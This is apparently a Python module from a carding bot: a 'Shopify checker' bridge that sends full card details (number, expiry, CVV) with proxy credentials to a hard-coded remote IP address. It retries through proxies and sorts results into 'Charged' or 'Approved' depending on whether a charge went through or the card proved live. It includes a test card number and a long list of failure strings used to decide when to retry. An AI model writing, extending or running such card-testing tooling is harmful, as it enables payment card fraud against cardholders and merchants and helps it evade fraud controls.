"""
checker_bridge.py — Single-node Shopify checker API with 5× retry on error.
"""

import asyncio
import aiohttp
import json
import time
import logging
from urllib.parse import unquote as _urlunquote
from yarl import URL

log = logging.getLogger("checker_bridge")
log.setLevel(logging.DEBUG)

# ══════════════════════════════════════════════════════════════════════════════
#  CONFIG
# ══════════════════════════════════════════════════════════════════════════════

API_BASE = "http://5.175.222.144:8081"
MAX_RETRIES = 5
REQUEST_TIMEOUT = 120
_CONNECT_TIMEOUT = 5

# ── Dead / error indicators (agar response mein yeh aaye toh retry) ─────────
_DEAD_INDICATORS = (
    'receipt id is empty', 'handle is empty', 'product id is empty',
    'tax amount is empty', 'payment method identifier is empty',
    'invalid url', 'error in 1st req', 'error in 1 req',
    'cloudflare', 'connection failed', 'timed out',
    'access denied', 'tlsv1 alert', 'ssl routines',
    'could not resolve', 'domain name not found',
    'name or service not known', 'openssl ssl_connect',
    'empty reply from server', 'httperror504', 'http error',
    'timeout', 'unreachable', 'ssl error',
    '502', '503', '504', 'bad gateway', 'service unavailable',
    'gateway timeout', 'network error', 'connection reset',
    'failed to detect product', 'failed to create checkout',
    'failed to tokenize card', 'failed to get proposal data',
    'submit rejected', 'handle error', 'http 404',
    'delivery_delivery_line_detail_changed', 'delivery_address2_required',
    'url rejected', 'malformed input', 'amount_too_small', 'amount too small',
    'site dead', 'captcha_required', 'captcha required', 'site errors',
    'all products sold out', 'no_session_token', 'tokenize_fail',
    'proxy dead', 'proxy burned', 'change your proxy', 'proxy error',
    'authentication failed', 'could not connect', 'all nodes failed',
    'error', 'failed', 'exception', 'unknown',
)

# ══════════════════════════════════════════════════════════════════════════════
#  HTTP SESSION
# ══════════════════════════════════════════════════════════════════════════════

_session: aiohttp.ClientSession | None = None

async def _get_session() -> aiohttp.ClientSession:
    global _session
    if _session is None or _session.closed:
        conn = aiohttp.TCPConnector(
            limit=8000,
            limit_per_host=2000,
            ttl_dns_cache=300,
            keepalive_timeout=60,
            enable_cleanup_closed=True,
        )
        _session = aiohttp.ClientSession(
            connector=conn,
            timeout=aiohttp.ClientTimeout(
                total=REQUEST_TIMEOUT,
                connect=_CONNECT_TIMEOUT,
            ),
        )
    return _session


# ══════════════════════════════════════════════════════════════════════════════
#  PROXY FORMATTER  →  host:port:user:pass
# ══════════════════════════════════════════════════════════════════════════════

def _proxy_data_to_proxy_str(proxy_data: dict | None) -> str | None:
    """Convert bot.py proxy dict to host:port:user:pass (no protocol)."""
    if not proxy_data:
        return None

    # 1) Agar proxy_url pehle se bana hua hai (http://user:pass@host:port)
    existing = proxy_data.get("proxy_url")
    if existing and isinstance(existing, str) and existing.strip():
        url = existing.strip()
        if "://" in url:
            _, rest = url.split("://", 1)
        else:
            rest = url

        if "@" in rest:
            auth, hostport = rest.split("@", 1)
            if ":" in hostport:
                host, port = hostport.rsplit(":", 1)
                if ":" in auth:
                    user, pw = auth.split(":", 1)
                    user = _urlunquote(user)
                    pw = _urlunquote(pw)
                    return f"{host}:{port}:{user}:{pw}"
                return f"{host}:{port}"
        else:
            if ":" in rest:
                parts = rest.split(":")
                if len(parts) == 4:
                    return rest
                elif len(parts) == 2:
                    return rest
        return rest

    # 2) Fields se banao
    ip   = str(proxy_data.get("ip")   or "").strip()
    port = str(proxy_data.get("port") or "").strip()
    user = proxy_data.get("username")
    pw   = proxy_data.get("password")

    if not ip or not port:
        return None

    if user and pw:
        return f"{ip}:{port}:{user}:{pw}"
    return f"{ip}:{port}"


# ══════════════════════════════════════════════════════════════════════════════
#  RESULT NORMALISATION
# ══════════════════════════════════════════════════════════════════════════════

def _map_result(raw: dict, cc_str: str, site_url: str) -> dict:
    response = raw.get("Response", "Unknown")
    price    = raw.get("Price", "-")
    gate     = raw.get("Gate", "Shopify")

    rl = response.lower()
    if "order_placed" in rl or "order completed" in rl or "💎" in response:
        status = "Charged"
    elif any(k in rl for k in [
        "invalid_cvv", "incorrect_cvv", "insufficient_funds",
        "approved", "invalid_cvc", "incorrect_cvc",
        "incorrect_zip", "insufficient funds",
    ]):
        status = "Approved"
    else:
        status = response

    result = {
        "Response": response,
        "Price":    price,
        "Gate":     gate,
        "Status":   status,
        "CC":       raw.get("CC", cc_str),
        "Site":     raw.get("Site", site_url),
    }
    p = str(result["Price"])
    if p not in ("-", "", "0.00") and not p.startswith("$"):
        result["Price"] = f"${p}"
    return result


def _is_dead(response_text: str) -> bool:
    if not response_text:
        return True
    rl = response_text.lower()
    return any(ind in rl for ind in _DEAD_INDICATORS)


# ══════════════════════════════════════════════════════════════════════════════
#  SINGLE API CALL
# ══════════════════════════════════════════════════════════════════════════════

async def _call_api(cc_str: str, proxy_str: str) -> dict:
    """Call the checker API. Returns dict or raises on failure."""
    sess = await _get_session()

    # Exact format: http://5.175.222.144:8081/?cc|mm|yy|cvv&proxy=host:port:user:pass
    # IMPORTANT: server expects literal '|' in query string.
    # aiohttp/yarl encodes '|' → '%7C' by default which breaks the API.
    # We use yarl.URL(encoded=True) to preserve raw characters.
    url_str = f"{API_BASE}/?{cc_str}&proxy={proxy_str}"
    url = URL(url_str, encoded=True)

    cc4 = cc_str.split('|')[0][-4:] if '|' in cc_str else cc_str[-4:]
    log.debug(f"[api] → {API_BASE} | cc=...{cc4} | proxy={proxy_str[:35]}...")

    async with sess.get(
        url,
        timeout=aiohttp.ClientTimeout(total=REQUEST_TIMEOUT, connect=_CONNECT_TIMEOUT),
    ) as resp:
        if resp.status != 200:
            text = await resp.text()
            raise RuntimeError(f"HTTP {resp.status}: {text[:80]}")

        # Pehle text lo, phir JSON parse karo (safe fallback)
        text = (await resp.text()).strip()
        try:
            data = json.loads(text)
        except Exception:
            data = {"Response": text, "Price": "-", "Gate": "Shopify"}
        return data


# ══════════════════════════════════════════════════════════════════════════════
#  PUBLIC API
# ══════════════════════════════════════════════════════════════════════════════

async def check_card_site(cc_str: str, site_url: str, proxy_data: dict | None) -> dict:
    """
    Main entry point (same signature as before so bot.py needs ZERO changes).
    site_url is ignored — new API does not need it.
    Retries up to MAX_RETRIES times on dead/error until proper response.
    """
    proxy_str = _proxy_data_to_proxy_str(proxy_data)
    if not proxy_str:
        return {
            "Response": "No proxy – add one with /proxy",
            "Price": "-", "Gate": "-", "Status": "No proxy",
            "CC": cc_str, "Site": site_url,
        }

    t_start = time.monotonic()
    cc4 = cc_str.split('|')[0][-4:] if '|' in cc_str else cc_str[-4:]
    log.info(f"[bridge] check_card_site | cc=...{cc4} | proxy={proxy_str[:25]}...")

    last_result = None
    last_err = "Unknown error"

    for attempt in range(1, MAX_RETRIES + 1):
        try:
            raw = await _call_api(cc_str, proxy_str)
            result = _map_result(raw, cc_str, site_url)
            response_text = result.get("Response", "")

            log.info(
                f"[bridge] attempt {attempt}/{MAX_RETRIES} | {(time.monotonic()-t_start)*1000:.0f}ms"
                f" | status={result.get('Status')} | resp={response_text[:60]}"
            )

            # Agar response sahi hai (dead nahi), toh return immediately
            if not _is_dead(response_text):
                return result

            # Dead response — save karo aur retry karo (agar attempt bachi ho)
            last_result = result
            last_err = f"Dead response: {response_text[:80]}"
            log.warning(f"[bridge] dead response on attempt {attempt}, retrying...")

            if attempt < MAX_RETRIES:
                await asyncio.sleep(0.5)

        except Exception as e:
            last_err = f"{type(e).__name__}: {str(e)[:80]}"
            log.warning(f"[bridge] attempt {attempt}/{MAX_RETRIES} failed — {last_err}")
            if attempt < MAX_RETRIES:
                await asyncio.sleep(0.5)
            else:
                break

    # Sab retries khatam — last response return karo (agar mila ho) warna error
    if last_result is not None:
        log.warning(f"[bridge] all {MAX_RETRIES} retries exhausted, returning last response")
        return last_result

    return {
        "Response": f"API Error after {MAX_RETRIES} retries: {last_err}",
        "Price": "-", "Gate": "-", "Status": "Error",
        "CC": cc_str, "Site": site_url,
    }


async def test_site(
    site_url:   str,
    proxy_data: dict | None,
    test_card:  str = "4031630422575208|01|2030|280",
) -> dict:
    raw = await check_card_site(test_card, site_url, proxy_data)
    response_text = raw.get("Response", "")
    price = raw.get("Price", "-")
    status = "working"
    if "proxy dead" in response_text.lower():
        status = "proxy_dead"
    elif _is_dead(response_text):
        status = "dead"
    return {"status": status, "response": response_text, "site": site_url, "price": price}


# ══════════════════════════════════════════════════════════════════════════════
#  BACKWARD COMPAT (node management — single API, no-op)
# ══════════════════════════════════════════════════════════════════════════════

def get_all_nodes() -> list[str]:
    return [API_BASE]

async def check_node_health(node: str) -> bool:
    if node == API_BASE:
        try:
            sess = await _get_session()
            async with sess.get(
                f"{API_BASE}/",
                timeout=aiohttp.ClientTimeout(total=6, connect=4),
            ) as r:
                return r.status == 200
        except Exception:
            return False
    return False

def is_node_disabled(node: str) -> bool:
    return False

def disable_node(node: str) -> None:
    log.info(f"[api] disable_node is no-op in single-API mode: {node}")

def enable_node(node: str) -> None:
    log.info(f"[api] enable_node is no-op in single-API mode: {node}")
